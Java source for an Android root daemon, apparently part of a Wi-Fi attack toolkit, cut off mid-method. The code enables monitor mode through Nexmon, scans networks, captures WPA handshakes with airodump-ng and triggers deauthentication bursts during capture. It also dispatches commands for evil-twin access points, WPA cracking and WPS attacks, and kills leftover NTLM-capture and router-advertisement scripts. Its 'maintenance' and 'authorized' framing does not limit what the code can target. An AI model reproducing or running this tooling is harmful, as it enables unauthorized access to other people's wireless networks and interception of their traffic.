package org.lambdaproject.lambda;

import android.content.Context;
import android.os.*;
import android.util.Base64;
import org.json.*;
import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.*;

/** Maintenance warden launched explicitly by authorized ADB root, never by an APK.
 * Allowlisted monitor/survey/EAPOL/one-cycle deauth/restore. No shell interpolation.
 */
public final class RadioWarden {
    private static final String BASE="/data/local/tmp/lambda-operator-radio";
    private static final String NEX=BASE+"/nexutil",LIB=BASE+"/libnexmon.so";
    private final String identity=UUID.randomUUID().toString();
    private Object provider,activityManager;
    private java.lang.reflect.Method providerCall;
    private Binder providerToken;
    private String token,iface,ifindex,kind,originalType,session,originalMac,apIface,upstreamIface;
    private int ipForwardPrev=-1;
    private boolean originalWifi,originalUp,changed,monitor;private volatile boolean closing;
    private long lease;
    private java.lang.Process capture;
    private DeauthBurst burst;
    private final LinkedHashMap<String,JSONObject> networks=new LinkedHashMap<>();
    private final HashMap<String,Integer> observationChannels=new HashMap<>();
    private java.nio.channels.FileLock processLock;
    public static void main(String[] args)throws Exception {
        if(android.os.Process.myUid()!=0)throw new SecurityException("Requires authorized maintenance root");
        if(!read("/sys/class/dmi/id/product_name").isEmpty())throw new IllegalStateException("Android only");
        RadioWarden w=new RadioWarden();w.start();
    }
    private void start()throws Exception {
        File base=new File(BASE);if(!base.isDirectory())throw new IOException("Provision worker first");
        RandomAccessFile lockFile=new RandomAccessFile(new File(base,"worker.lock"),"rw");
        processLock=lockFile.getChannel().tryLock();if(processLock==null)throw new IllegalStateException("Worker already active");
        // setsid/nohup do not escape Android init's per-service cgroup teardown.
        // A separate root-owned runtime group keeps this explicit maintenance
        // daemon alive when authorized ADB is returned to the unprivileged shell.
        File group=new File("/sys/fs/cgroup/uid_0/lambda-radio");
        if(!group.isDirectory()&&!group.mkdir())throw new IOException("worker_cgroup_unavailable");
        try(FileOutputStream procs=new FileOutputStream(new File(group,"cgroup.procs"))){procs.write(Integer.toString(android.os.Process.myPid()).getBytes(StandardCharsets.US_ASCII));}
        if(!read("/proc/self/cgroup").contains("0::/uid_0/lambda-radio"))throw new IOException("worker_cgroup_not_confirmed");
        try(FileOutputStream pid=new FileOutputStream(new File(BASE,"worker.pid"))){pid.write(Integer.toString(android.os.Process.myPid()).getBytes(StandardCharsets.US_ASCII));}
        Looper.prepareMainLooper();
        // Same external-provider path used by AOSP's authenticated `content` CLI.
        activityManager=Class.forName("android.app.ActivityManager").getMethod("getService").invoke(null);
        connectCore();
        if(!cmd("/system/bin/getprop","ro.product.device").trim().equals("beyond1lte"))throw new IllegalStateException("Unexpected device");
        if(!cmd("/system/bin/getenforce").trim().equals("Enforcing"))throw new IllegalStateException("SELinux must remain enforcing");
        // Register cleanup before recovery: a failing journal/recover must not
        // exit the root daemon with no shutdown hook to restore the radio.
        Runtime.getRuntime().addShutdownHook(new Thread(()->{closing=true;try{restore();}catch(Exception ignored){}try{CoolingJob.recover();}catch(Exception ignored){}}));
        // Recover an interrupted internal monitor session before accepting work.
        File journal=new File(BASE,"restore.json");
        if(journal.exists()){JSONObject old=new JSONObject(read(journal.getPath()));iface=old.getString("iface");ifindex=old.getString("ifindex");kind=old.getString("kind");originalType=old.optString("type","managed");originalWifi=old.optBoolean("wifi");originalUp=old.optBoolean("up");monitor=old.optBoolean("monitor",true);apIface=old.optString("ap",null);originalMac=old.optString("mac",null);changed=true;restore();}
        CoolingJob.recover();
        WpsJob.recover();
        killStrays();
        System.out.println("Lambda radio warden ready; allowlisted bounded operations; SELinux enforcing");
        try {
            while(!closing&&!Thread.currentThread().isInterrupted()){
                if(changed&&SystemClock.elapsedRealtime()>lease)restore();
                try{
                    JSONObject response=rpc(new JSONObject().put("adapters",inventory()).put("benchmark",CrackBenchmark.capabilities()).put("wps",WpsJob.capabilities()));
                    if(!response.optBoolean("ok"))throw new IOException(response.optString("detail","worker_rejected"));
                    JSONObject command=response.optJSONObject("command");
                    if(command!=null)execute(command);else Thread.sleep(1200);
                }catch(Exception e){
                    // Core is another process: app updates/force-stops kill it.
                    // Keep the root daemon alive and re-resolve its provider.
                    if(closing||Thread.currentThread().isInterrupted())throw e;
                    System.out.println("Lambda warden reconnecting to Core: "+e);
                    try{Thread.sleep(2000);connectCore();}catch(Exception retry){Thread.sleep(2000);}
                }
            }
        }finally{restore();processLock.release();lockFile.close();}
    }

    /** Re-acquire Core's external provider (used by the reconnect loop). */
    private void connectCore()throws Exception {
        if(providerToken!=null){
            try{Class.forName("android.app.IActivityManager").getMethod("removeContentProviderExternal",String.class,IBinder.class)
                .invoke(activityManager,"org.lambdaproject.lambda.core",providerToken);}catch(Exception ignored){}
        }
        providerToken=new Binder();
        Object holder=Class.forName("android.app.IActivityManager").getMethod("getContentProviderExternal",String.class,int.class,IBinder.class,String.class)
            .invoke(activityManager,"org.lambdaproject.lambda.core",0,providerToken,"LambdaRadioWarden");
        if(holder==null)throw new IOException("core_provider_missing");
        provider=holder.getClass().getField("provider").get(holder);
        providerCall=Class.forName("android.content.IContentProvider").getMethod("call",android.content.AttributionSource.class,String.class,String.class,String.class,Bundle.class);
    }
    private JSONObject rpc(JSONObject data)throws Exception {
        data.put("worker",identity);
        Bundle b=(Bundle)providerCall.invoke(provider,new android.content.AttributionSource.Builder(0).setPackageName("root").build(),"org.lambdaproject.lambda.core","radio_worker",data.toString(),null);
        if(b==null)throw new IOException("core_unavailable");return new JSONObject(b.getString("json"));
    }
    private JSONObject tick(JSONObject progress)throws Exception {
        if(closing)throw new InterruptedException("worker_stopping");
        JSONObject reply=rpc(new JSONObject().put("token",token).put("progress",progress));
        if(!reply.optBoolean("ok")||reply.optBoolean("cancel"))throw new InterruptedException("cancelled");
        return reply;
    }
    private void execute(JSONObject command)throws Exception {
        token=command.getString("token");JSONObject result=null;String error=null;
        try {
            String tool=command.getString("tool");JSONObject a=command.getJSONObject("args");
            if(tool.equals("radio.wifi_on")){CoreEngine.keys(a);cmd("/system/bin/svc","wifi","enable");
                for(int n=0;n<16&&!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1");n++)Thread.sleep(500);
                if(!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1"))throw new IOException("wifi_enable_failed");
                result=new JSONObject().put("wifi_on",true);}
            else if(tool.equals("radio.scan"))result=survey(a);
            else if(tool.equals("radio.capture"))result=record(a);
            else if(tool.equals("radio.deauth"))result=deauth(a);
            else if(tool.equals("radio.ap"))result=evilTwin(a);
            else if(tool.equals("radio.release")){CoreEngine.keys(a);restore();result=new JSONObject().put("restored",true);}
            else if(tool.equals("system.cooling"))result=CoolingJob.run(a,progress->tick(progress));
            else if(tool.equals("system.heater"))result=HeaterJob.run(a,progress->tick(progress));
            else if(tool.equals("system.desktop"))result=desktop(a);
            else if(tool.equals("benchmark.wpa")){restore();result=new CrackBenchmark(a,p->tick(p)).run();}
            else if(tool.equals("crack.wpa")){restore();result=new CrackJob(a.getJSONObject("source"),a.getJSONObject("dictionary"),p->tick(p),a.optString("engine","auto")).run();}
            else if(tool.equals("wifi.connect_verified")){restore();result=connectVerified(a);}
            else if(tool.equals("wps.oneshot")){restore();result=WpsJob.run(a,p->tick(p));}
            else throw new SecurityException("unknown_radio_operation");
        }catch(Exception e){
            error=e.getMessage()==null?e.getClass().getSimpleName():e.getMessage();
            try{restore();}catch(Exception cleanup){error+="; restore_failed: "+cleanup.getMessage();}
        }
        JSONObject update=new JSONObject().put("token",token);
        if(result!=null)update.put("result",result);else update.put("error",error);
        rpc(update);token=null;
    }
    /** Runs a fixed script while ticking progress so Core's heartbeat never
     *  expires. A cancelled start aborts; a cancelled stop is allowed to finish. */
    private String runScript(String path,long timeoutSeconds,boolean abortOnCancel)throws Exception {
        java.lang.Process p=new ProcessBuilder("/system/bin/sh",path).redirectErrorStream(true).start();
        ByteArrayOutputStream out=new ByteArrayOutputStream();
        Thread drain=new Thread(()->{try{byte[] b=new byte[4096];int n;while((n=p.getInputStream().read(b))!=-1)if(out.size()<200000)out.write(b,0,n);}catch(IOException ignored){}});
        drain.start();
        long deadline=SystemClock.elapsedRealtime()+timeoutSeconds*1000;
        try{
            while(p.isAlive()){
                if(SystemClock.elapsedRealtime()>deadline){p.destroyForcibly();throw new IOException("command_timeout: "+new File(path).getName());}
                try{tick(new JSONObject().put("phase",new File(path).getName().equals("start.sh")?"starting":"stopping"));}
                catch(Exception cancel){if(abortOnCancel){p.destroyForcibly();throw cancel;}}
                Thread.sleep(750);
            }
            drain.join(1000);
            String value=out.toString("UTF-8");
            if(p.exitValue()!=0)throw new IOException(new File(path).getName()+": "+value.substring(0,Math.min(300,value.length())));
            return value;
        }finally{if(p.isAlive())p.destroyForcibly();}
    }

    /** LEX desktop: fixed root-owned scripts, no caller paths or shell text. */
    private JSONObject desktop(JSONObject a)throws Exception {
        CoreEngine.keys(a,"action");
        String action=a.getString("action");
        tick(new JSONObject().put("phase",action.equals("start")?"starting":"stopping"));
        if(action.equals("start")){
            try{
                runScript("/data/local/lex/start.sh",90,true);
                String status=read("/data/local/lex/status.json");
                if(status.isEmpty())throw new IOException("desktop_status_missing");
                JSONObject result=new JSONObject(status);
                if(!result.optBoolean("running")&&result.optInt("running",0)!=1)throw new IOException("desktop_start_failed");
                return result;
            }catch(Exception e){
                // A failed or cancelled start must not leave mounts/daemons up.
                try{runScript("/data/local/lex/stop.sh",60,false);}catch(Exception ignored){}
                throw e;
            }
        }
        if(action.equals("stop")){
            runScript("/data/local/lex/stop.sh",60,false);
            String status=read("/data/local/lex/status.json");
            if(status.isEmpty())throw new IOException("desktop_status_missing");
            return new JSONObject(status);
        }
        throw new IllegalArgumentException("invalid desktop action");
    }
    private JSONObject connectVerified(JSONObject a)throws Exception {
        CoreEngine.keys(a,"ssid","bssid","password");
        String ssid=a.getString("ssid"),bssid=a.getString("bssid");long started=SystemClock.elapsedRealtime();
        tick(new JSONObject().put("phase","connecting").put("ssid",ssid).put("bssid",bssid));
        // Never propagate CLI diagnostics: they may contain the supplied key.
        try{cmd("/system/bin/cmd","wifi","set-wifi-enabled","enabled");}
        catch(Exception e){throw new IOException("wifi_enable_failed");}
        boolean requested=false;
        while(SystemClock.elapsedRealtime()-started<35000){
            tick(new JSONObject().put("phase","connecting").put("ssid",ssid).put("bssid",bssid));
            String status=cmd("/system/bin/cmd","wifi","status");
            if(!requested&&status.contains("Wifi is enabled")){
                try{cmd("/system/bin/cmd","wifi","connect-network",ssid,"wpa2",a.getString("password"),"-b",bssid);}
                catch(Exception e){throw new IOException("wifi_connection_request_failed");}
                requested=true;
            }else if(requested){
                // Verify the primary association, not CLI acceptance or a stale
                // scan entry. A local address is sufficient; internet is separate.
                for(String line:status.split("\n"))if(line.startsWith("WifiInfo:")
                        &&line.contains("SSID: \""+ssid+"\", BSSID: "+bssid.toLowerCase(Locale.ROOT)+",")
                        &&line.contains("Supplicant state: COMPLETED")
                        &&line.matches(".*IP: /[0-9a-fA-F:.]+,.*")&&!line.contains("IP: /0.0.0.0,")){
                    return new JSONObject().put("connected",true).put("ssid",ssid).put("bssid",bssid)
                        .put("wall_ms",SystemClock.elapsedRealtime()-started).put("internet_verified",false);
                }
            }
            Thread.sleep(750);
        }
        throw new IOException("wifi_connection_not_confirmed");
    }
    /** Previous worker generations can leave orphaned AP daemons behind when
     *  the worker is replaced mid-job; they keep the radio busy and hot. */
    private static void killStrays()throws Exception {
        String ps=cmd("/system/bin/ps","-A","-o","PID,ARGS");
        for(String line:ps.split("\n")){
            if(line.contains("/data/local/tmp/lambda-ap/hostapd.conf")||line.contains("ap-dnsmasq.conf")||line.contains("ap-sniff.pcap")||line.contains("ra-sender.py")||line.contains("ntlm-capture.py")){
                String pid=line.trim().split("\\s+")[0];
                if(pid.matches("[0-9]+"))try{cmd("/system/bin/kill","-9",pid);}catch(Exception ignored){}
            }
        }
    }
    private static String read(String p){try{return new String(java.nio.file.Files.readAllBytes(new File(p).toPath()),StandardCharsets.UTF_8).trim();}catch(Exception e){return "";}}
    private static String t(String es,String en){return Locale.getDefault().getLanguage().equals("en")?en:es;}
    private static String cmd(String... args)throws Exception {return cmd(7,args);}
    private static String cmd(long seconds,String... args)throws Exception {
        java.lang.Process p=new ProcessBuilder(args).redirectErrorStream(true).start();
        ByteArrayOutputStream out=new ByteArrayOutputStream();
        Thread drain=new Thread(()->{try{byte[] b=new byte[4096];int n;while((n=p.getInputStream().read(b))!=-1)if(out.size()<200000)out.write(b,0,n);}catch(IOException ignored){}});drain.start();
        if(!p.waitFor(seconds,TimeUnit.SECONDS)){p.destroyForcibly();drain.join(1000);throw new IOException("command_timeout: "+new File(args[0]).getName());}
        drain.join(1000);String value=out.toString("UTF-8");
        if(p.exitValue()!=0)throw new IOException(new File(args[0]).getName()+": "+value.substring(0,Math.min(300,value.length())));
        return value;
    }
    private static String match(String text,String regex){Matcher m=Pattern.compile(regex).matcher(text);return m.find()?m.group(1):"";}
    private String nex(String... extra)throws Exception {
        ArrayList<String> args=new ArrayList<>(Arrays.asList(NEX,"-I","wlan0"));args.addAll(Arrays.asList(extra));
        String out=cmd(args.toArray(new String[0]));
        if(out.contains("error")||out.contains("Error")||out.contains("failed")){
            System.out.println("nex-fail "+Arrays.toString(extra)+" "+out.substring(0,Math.min(100,out.length())).replace('\n',' '));
            throw new IOException("nexmon: "+out.substring(0,Math.min(180,out.length())));
        }
        return out;
    }
    private JSONArray inventory()throws Exception {
        JSONArray result=new JSONArray();
        if(new File("/sys/class/net/wlan0").exists())result.put(new JSONObject().put("id","internal").put("kind","internal").put("name","Samsung S10").put("chipset","BCM4375B1 · Nexmon").put("interface","wlan0").put("supported",new File(NEX).canExecute()&&new File(LIB).isFile()));
        File[] nets=new File("/sys/class/net").listFiles();if(nets==null)return result;
        for(File net:nets){
            String name=net.getName();if(!name.matches("[a-zA-Z0-9_.-]{1,15}")||name.equals("wlan0")||name.equals("wlan1")||name.equals("p2p0"))continue;
            File dev=new File(net,"device").getCanonicalFile(),usb=dev;
            while(usb!=null&&!new File(usb,"idVendor").exists())usb=usb.getParentFile();
            if(usb==null||!new File(net,"phy80211").exists())continue;
            String vid=read(usb+"/idVendor"),pid=read(usb+"/idProduct"),driver=new File(dev,"driver").getCanonicalFile().getName();
            boolean supported=Arrays.asList("rtl88XXau","8812au","88XXau","rtl88x2bu","88x2bu","rtl8188eu","8188eu","mt76x2u","mt76x0u","ath9k_htc","rt2800usb").contains(driver);
            String product=vid.equals("0bda")&&pid.equals("8812")?"ALFA AWUS036ACH / RTL8812AU":read(usb+"/product");
            String index=read(net+"/ifindex"),id=name+":"+index+":"+usb.getName()+":"+read(usb+"/devnum");
            result.put(new JSONObject().put("id",id).put("kind","external").put("name",product.isEmpty()?"USB Wi-Fi":product).put("chipset",driver).put("interface",name).put("ifindex",index).put("vid_pid",vid+":"+pid).put("supported",supported));
            if(result.length()>=32)break;
        }
        File[] usbDevices=new File("/sys/bus/usb/devices").listFiles();
        if(usbDevices!=null)for(File u:usbDevices){
            if(!read(u+"/idVendor").equals("0bda")||!read(u+"/idProduct").equals("8812"))continue;
            String key=u.getName()+":"+read(u+"/devnum");boolean bound=false;
            for(int i=0;i<result.length();i++)if(result.getJSONObject(i).optString("id").endsWith(":"+key))bound=true;
            if(!bound&&result.length()<32)result.put(new JSONObject().put("id","usb:"+key).put("kind","external").put("name","ALFA AWUS036ACH / RTL8812AU").put("chipset","USB detected · driver pending").put("vid_pid","0bda:8812").put("supported",false));
        }
        return result;
    }
    private JSONObject adapter(String id)throws Exception {JSONArray devices=inventory();for(int i=0;i<devices.length();i++){JSONObject d=devices.getJSONObject(i);if(d.getString("id").equals(id)&&d.optBoolean("supported"))return d;}throw new IOException("adapter_missing_or_unsupported");}
    private void prepare(String id)throws Exception {
        restore();JSONObject d=adapter(id);
        if(!id.equals("internal")){
            for(int n=0;n<8;n++){tick(new JSONObject().put("phase","stabilizing").put("seconds",n));Thread.sleep(1000);adapter(id);}
        }
        iface=d.getString("interface");kind=d.getString("kind");ifindex=read("/sys/class/net/"+iface+"/ifindex");
        originalType=match(cmd("/system/bin/iw","dev",iface,"info"),"(?m)^\\s*type (\\w+)");
        if(!originalType.equals("managed"))throw new IOException("interface_already_in_use_or_monitor");
        originalUp=(Long.decode(read("/sys/class/net/"+iface+"/flags"))&1)!=0;
        originalWifi=cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1");
        JSONObject journal=new JSONObject().put("iface",iface).put("ifindex",ifindex).put("kind",kind).put("type",originalType).put("wifi",originalWifi).put("up",originalUp).put("monitor",true);
        try(FileOutputStream out=new FileOutputStream(new File(BASE,"restore.json"))){out.write(journal.toString().getBytes(StandardCharsets.UTF_8));out.getFD().sync();}
        changed=true;monitor=true;lease=SystemClock.elapsedRealtime()+120000;
        tick(new JSONObject().put("phase","activating").put("adapter",d));
        if(kind.equals("internal")){
            // Stop the framework, then check Nexmon with the bus released. The
            // extra Wi-Fi on/off cycle is only a recovery path: it leaves the
            // driver unable to capture monitor frames on this device.
            cmd("/system/bin/svc","wifi","disable");
            for(int n=0;n<8&&!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("0");n++)Thread.sleep(250);
            Thread.sleep(400);cmd("/system/bin/ip","link","set",iface,"up");
            boolean verified=false;Exception last=null;
            for(int n=0;n<5&&!verified;n++){try{verified=nex("-g0x600","-l128").contains("nexmon");}catch(Exception e){last=e;System.out.println("nex-retry "+n+": "+e.getMessage().replace('\n',' '));}if(!verified)Thread.sleep(600);}
            if(!verified){
                cmd("/system/bin/svc","wifi","enable");Thread.sleep(3500);
                cmd("/system/bin/svc","wifi","disable");
            for(int n=0;n<8&&!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("0");n++)Thread.sleep(250);
            Thread.sleep(400);cmd("/system/bin/ip","link","set",iface,"up");
                for(int n=0;n<5&&!verified;n++){try{verified=nex("-g0x600","-l128").contains("nexmon");}catch(Exception e){last=e;}if(!verified)Thread.sleep(600);}
            }
            if(!verified)throw new IOException("nexmon_not_verified",last);
            nex("-s0x613","-i","-v2");String monitor=nex("-m");
            String value=match(monitor,"(-?[0-9]+)\\s*$");if(value.isEmpty()||(Long.parseLong(value)&2)==0)throw new IOException("monitor_not_confirmed");
        }else{
            cmd("/system/bin/ip","link","set",iface,"down");cmd("/system/bin/iw","dev",iface,"set","type","monitor");cmd("/system/bin/ip","link","set",iface,"up");
            if(!cmd("/system/bin/iw","dev",iface,"info").contains("type monitor"))throw new IOException("monitor_not_confirmed");
        }
        session=UUID.randomUUID().toString();networks.clear();observationChannels.clear();
    }
    private void present()throws Exception {if(iface==null||!ifindex.equals(read("/sys/class/net/"+iface+"/ifindex")))throw new IOException("adapter_disconnected");}
    private void channel(int ch)throws Exception {
        present();if(ch<1||ch>165)throw new IOException("invalid_channel");
        if(kind.equals("internal")){nex("-k0x"+Integer.toHexString(0x1000|ch),"-i");String current=nex("-k");if(!current.matches("(?s).*channel\\s+"+ch+"(?:\\D.*|$)")){
                // nexutil also prints 'chanspec: 0x1006, 6'; verify numeric chanspec.
                String hex=match(current,"chanspec: (0x[0-9a-fA-F]+)");if(hex.isEmpty()||(Long.decode(hex)&255)!=ch)throw new IOException("channel_not_confirmed");
            }}else cmd("/system/bin/iw","dev",iface,"set","channel",Integer.toString(ch),"HT20");
    }
    private ArrayList<Integer> channels()throws Exception {
        String phy=new File("/sys/class/net/"+iface+"/phy80211").getCanonicalFile().getName();
        String info=cmd("/system/bin/iw","phy",phy,"info");ArrayList<Integer> out=new ArrayList<>();
        for(String line:info.split("\n")){if(!line.contains("MHz")||line.contains("disabled"))continue;String n=match(line,"\\[([0-9]+)\\]");if(n.isEmpty())continue;int ch=Integer.parseInt(n);
            // Start with the validated 2.4 GHz band, no country override or DFS.
            if(ch>=1&&ch<=13&&!out.contains(ch))out.add(ch);
        }
        if(out.isEmpty())throw new IOException("no_allowed_2ghz_channels");return out;
    }
    private synchronized void startCapture(File file,String filter)throws Exception {
        if(closing)throw new InterruptedException("worker_stopping");
        stopCapture();ProcessBuilder pb=new ProcessBuilder(BASE+"/radio-guard","205","/system/bin/tcpdump","-i",iface,"-U","-n","-s","2048","-w",file.getPath(),filter);
        if(kind.equals("internal"))pb.environment().put("LD_PRELOAD",LIB);
        pb.redirectError(new File(BASE,"tcpdump.log"));pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(BASE,"worker.log")));capture=pb.start();
    }
    private synchronized void startAirodump(File directory,String bssid,int ch)throws Exception {
        if(closing)throw new InterruptedException("worker_stopping");
        File executable=new File(BASE,"airodump-ng");if(!executable.canExecute())throw new IOException("capture_tool_missing");
        stopCapture();
        ProcessBuilder pb=new ProcessBuilder(BASE+"/radio-guard","205",executable.getPath(),
            "--channel",Integer.toString(ch),"--bssid",bssid,"--write",new File(directory,"capture").getPath(),
            "--output-format","pcap,csv","--write-interval","1","--update","1","--ignore-negative-one",iface);
        pb.environment().put("PATH","/data/lambda-op:/system/bin:/system/xbin:/vendor/bin");
        if(kind.equals("internal"))pb.environment().put("LD_PRELOAD",LIB);
        // Keep the default stdin pipe open: the legacy input thread must block,
        // not spin on EOF from /dev/null. No UI/user input is sent to the process.
        pb.redirectErrorStream(true).redirectOutput(new File(directory,"airodump.log"));capture=pb.start();
    }
    private synchronized void stopCapture()throws Exception {if(capture!=null){capture.destroy();if(!capture.waitFor(3,TimeUnit.SECONDS)){capture.destroyForcibly();capture.waitFor(2,TimeUnit.SECONDS);}capture=null;}}
    private synchronized void restore()throws Exception {
        if(burst!=null)burst.finish("cancelled");
        stopCapture();if(!changed)return;ArrayList<String> errors=new ArrayList<>();
        stopNat();
        try{cmd("/system/bin/iptables","-D","INPUT","-i",apIface,"-j","ACCEPT");}catch(Exception ignored){}
        try{cmd("/system/bin/iptables","-D","OUTPUT","-o",apIface,"-j","ACCEPT");}catch(Exception ignored){}
        try{cmd("/system/bin/ip","rule","del","pref","8999");}catch(Exception ignored){}
        try{cmd("/system/bin/ip","rule","del","to","192.168.50.0/24","lookup","main","pref","8996");}catch(Exception ignored){}
        try{cmd("/system/bin/ip","rule","del","to","255.255.255.255/32","lookup","main","pref","9001");}catch(Exception ignored){}
        try{cmd("/system/bin/ip","route","del","255.255.255.255","dev",apIface==null?iface:apIface,"table","main");}catch(Exception ignored){}
        if(apIface!=null&&!apIface.equals(iface))try{cmd("/system/bin/iw","dev",apIface,"del");}catch(Exception ignored){}
        apIface=null;
        boolean same=ifindex!=null&&ifindex.equals(read("/sys/class/net/"+iface+"/ifindex"));
        if(same&&originalMac!=null&&!originalMac.isEmpty())try{cmd("/system/bin/ip","link","set",iface,"address",originalMac);}catch(Exception ignored){}
        originalMac=null;
        if(kind.equals("internal")){
            if(monitor)try{nex("-m0");}catch(Exception e){errors.add("monitor_disable");}
            try{cmd("/system/bin/ip","link","set",iface,"down");}catch(Exception ignored){}
            try{cmd("/system/bin/iw","dev",iface,"set","type","managed");}catch(Exception ignored){}
            try{cmd("/system/bin/svc","wifi",originalWifi?"enable":"disable");}catch(Exception e){errors.add("wifi_restore");}
            // Monitor/AP sessions can leave the supplicant enabled but
            // disconnected; one clean cycle re-associates the saved network.
            if(originalWifi&&!wifiEnsure())errors.add("wifi_reconnect");
        }else if(same){
            try{cmd("/system/bin/ip","link","set",iface,"down");cmd("/system/bin/iw","dev",iface,"set","type",originalType);if(originalUp)cmd("/system/bin/ip","link","set",iface,"up");}catch(Exception e){errors.add("external_restore");}
        }
        if(!errors.isEmpty())throw new IOException("restore_failed: "+errors);
        changed=false;monitor=false;session=null;new File(BASE,"restore.json").delete();
    }
    private boolean wifiConnected(){
        try{
            return cmd("/system/bin/cmd","wifi","status").contains("Wifi is connected")
                && cmd("/system/bin/ip","-4","-brief","addr","show","wlan0").contains("inet ");
        }catch(Exception e){return false;}
    }
    private boolean wifiEnsure(){
        try{
            if(wifiConnected())return true;
            // A monitor/AP session can leave the supplicant enabled but stuck.
            // Cycle it quickly: the worker must keep answering heartbeats, so
            // the re-association happens in the background after we return.
            cmd("/system/bin/svc","wifi","disable");Thread.sleep(1500);
            cmd("/system/bin/svc","wifi","enable");
            return true;
        }catch(Exception ignored){return false;}
    }
    private JSONObject survey(JSONObject args)throws Exception {
        CoreEngine.keys(args,"adapter");
        ArrayList<Integer> failed=new ArrayList<>();
        prepare(args.getString("adapter"));
        // Beacons repeat ~10/s: one 420 ms pass per channel is enough, and a
        // second pass only runs when the radio captured nothing at all.
        ArrayList<Integer> channels=channels();
        sweep(channels,failed,new File(BASE,"survey.pcap"),1);
        if(networks.isEmpty())sweep(channels,failed,new File(BASE,"survey.pcap"),1);
        if(networks.isEmpty()){
            // Known transient: after some AP sessions the monitor captures
            // nothing although Nexmon reports monitor mode. One full Wi-Fi
            // cycle restores the radio.
            restore();cmd("/system/bin/svc","wifi","enable");Thread.sleep(4000);
            prepare(args.getString("adapter"));
            sweep(channels(),failed,new File(BASE,"survey.pcap"),1);
        }
        lease=SystemClock.elapsedRealtime()+120000;
        JSONArray rows=new JSONArray();ArrayList<JSONObject> sorted=new ArrayList<>(networks.values());sorted.sort((x,y)->Integer.compare(y.optInt("rssi_dbm"),x.optInt("rssi_dbm")));for(JSONObject n:sorted)rows.put(n);
        return new JSONObject().put("session",session).put("networks",rows).put("band","2.4 GHz").put("failed_channels",new JSONArray(failed)).put("lease_seconds",120).put("expires_elapsed_ms",lease).put("monitor",true).put("partial",!failed.isEmpty());
    }
    private void sweep(ArrayList<Integer> channels,ArrayList<Integer> failed,File file,int passes)throws Exception {
        startCapture(file,"type mgt subtype beacon or type mgt subtype probe-resp");
        PcapTail tail=new PcapTail(file);
        try {
            for(int pass=0;pass<passes;pass++)for(int ch:channels){
                // One progress RPC per four channels: the binder round-trip
                // per channel cost more than the dwell itself.
                if(channels.indexOf(ch)%4==0)tick(new JSONObject().put("phase","scanning").put("channel",ch).put("networks",networks.size()).put("band","2.4 GHz"));
                try{channel(ch);}catch(IOException e){if(!failed.contains(ch))failed.add(ch);continue;}
                Thread.sleep(300);present();if(!capture.isAlive())throw new IOException("tcpdump_failed: "+read(BASE+"/tcpdump.log"));
                tail.drain((packet,record)->{WifiFrames.Frame f=WifiFrames.decode(packet,tail.link);if(f==null||!f.beacon||f.bssid.isEmpty())return;
                    int observed=f.channel==0?ch:f.channel;if(observed!=ch)return;
                    JSONObject old=networks.get(f.bssid);if(old==null&&networks.size()>=128)return;
                    JSONObject n=new JSONObject().put("ssid",f.ssid).put("bssid",f.bssid).put("channel",observed).put("security",f.security).put("rssi_dbm",f.signal).put("capture_supported",f.security.equals("WPA2")||f.security.equals("WPA")||f.security.equals("WPA2/WPA3"));
                    networks.put(f.bssid,n);observationChannels.put(f.bssid,observed);
                });
                if(file.length()>8*1024*1024)throw new IOException("survey_size_limit");
            }
        }finally{stopCapture();tail.close();file.delete();}
    }
    private JSONObject record(JSONObject args)throws Exception {
        CoreEngine.keys(args,"session","bssid","authorized");
        if(!args.getBoolean("authorized")||session==null||!session.equals(args.getString("session"))||!changed||SystemClock.elapsedRealtime()>lease)throw new IOException("scan_session_expired");
        String bssid=args.getString("bssid").toLowerCase(Locale.US);JSONObject target=networks.get(bssid);
        if(target==null||!target.optBoolean("capture_supported"))throw new IOException("network_not_in_scan_or_unsupported");
        channel(target.getInt("channel"));lease=SystemClock.elapsedRealtime()+200000;
        File directory=java.nio.file.Files.createTempDirectory(new File(BASE).toPath(),"capture-").toFile();
        File file=new File(directory,"capture-01.cap"),log=new File(directory,"airodump.log"),csv=new File(directory,"capture-01.csv");
        PcapTail tail=new PcapTail(file);CaptureEvidence evidence=new CaptureEvidence(bssid,tail);
        AirodumpStatus nativeStatus=new AirodumpStatus(log,bssid);
        long start=SystemClock.elapsedRealtime();String end="timeout";boolean reported=false;
        JSONObject inline=null;boolean inlineClaimed=false;burst=null;
        try {
            startAirodump(directory,bssid,target.getInt("channel"));
            while(SystemClock.elapsedRealtime()-start<180000){
                present();if(!capture.isAlive())throw new IOException("airodump_failed: exit "+capture.exitValue());
                evidence.drain();reported=nativeStatus.poll();
                // Drain EAPOL before accepting an optional active control. A
                // complete exchange or size/deadline stop never starts a burst.
                if(evidence.detected(reported)){end="handshake_detected";break;}
                if(file.length()>8*1024*1024||csv.length()>128*1024||evidence.retained.size()>118000||evidence.droppedEapol){end="size_limit";break;}
                if(burst!=null)inline=burst.poll();
                JSONObject progress=new JSONObject().put("phase","capturing").put("seconds",(SystemClock.elapsedRealtime()-start)/1000).put("messages",evidence.exchange.messages).put("eapol_frames",evidence.eapol).put("target",target).put("capture_backend","airodump-ng").put("airodump_handshake_reported",reported);
                if(inline!=null)progress.put("deauth",inline);
                JSONObject control=tick(progress).optJSONObject("capture_deauth");
                if(control!=null&&!inlineClaimed){
                    inlineClaimed=true;
                    CoreEngine.keys(control,"id","capture_token","session","bssid","expires_elapsed_ms");
                    inline=new JSONObject().put("id",CoreEngine.id(control,"id")).put("outcome","not_started").put("transmission_reported",false).put("effect_verified",false);
                    if(captureControlMatches(control,token,args,SystemClock.elapsedRealtime(),SystemClock.elapsedRealtime()-start)){
                        // A second heartbeat observes cancellation before launch.
                        tick(progress.put("deauth",inline));
                        try{burst=new DeauthBurst(control.getString("id"),bssid);burst.begin();inline=burst.poll();}
                        catch(IOException e){inline=burst.finish("failed").put("error",e.getMessage());}
                    }
                }
                Thread.sleep(400);
            }
        }catch(InterruptedException e){end="cancelled";}
        finally{try{if(burst!=null)inline=burst.finish(end.equals("cancelled")?"cancelled":"capture_ended");}finally{
            try{stopCapture();evidence.drain();reported=nativeStatus.poll();}
            finally{try{tail.close();nativeStatus.close();}
